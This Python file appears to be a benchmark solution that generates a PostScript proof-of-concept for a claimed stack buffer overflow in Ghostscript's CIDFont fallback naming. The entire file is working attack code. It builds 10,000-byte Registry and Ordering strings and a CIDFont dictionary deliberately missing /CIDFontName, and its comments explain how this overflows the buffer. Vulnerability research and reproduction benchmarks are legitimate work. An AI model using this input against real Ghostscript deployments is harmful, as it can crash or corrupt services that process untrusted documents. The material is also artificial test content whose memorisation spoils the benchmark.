import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability exists in Ghostscript's CIDFont fallback mechanism (zfcid.c).
        # When a CIDFont resource is defined without an explicit /CIDFontName, 
        # Ghostscript constructs a fallback name using "<Registry>-<Ordering>".
        # This construction uses a stack buffer (often 256 bytes) which can be overflowed.
        
        # We construct a PoC with sufficiently long Registry and Ordering strings.
        # Ground truth is 80KB, but ~20KB is sufficient to overflow the stack buffer reliably.
        
        registry = b"A" * 10000
        ordering = b"B" * 10000
        
        # Construct the PostScript file
        poc = b"%!PS\n"
        poc += b"10 dict begin\n"
        poc += b"  /CIDSystemInfo 3 dict begin\n"
        poc += b"    /Registry (" + registry + b") def\n"
        poc += b"    /Ordering (" + ordering + b") def\n"
        poc += b"    /Supplement 0 def\n"
        poc += b"  end def\n"
        
        # Required keys for a minimal valid CIDFont dictionary
        poc += b"  /CIDFontType 0 def\n"
        poc += b"  /FontMatrix [1 0 0 1 0 0] def\n"
        poc += b"  /FontBBox [0 0 1000 1000] def\n"
        poc += b"  /CIDCount 1 def\n"
        poc += b"  /GDBytes 2 def\n"
        poc += b"  /CIDMap <00> def\n"
        
        # Attempt to define the resource using the dictionary on the stack (currentdict).
        # Crucially, the dictionary lacks /CIDFontName, triggering the vulnerable fallback logic.
        poc += b"  /Exploit currentdict /CIDFont defineresource pop\n"
        poc += b"end\n"
        
        return poc
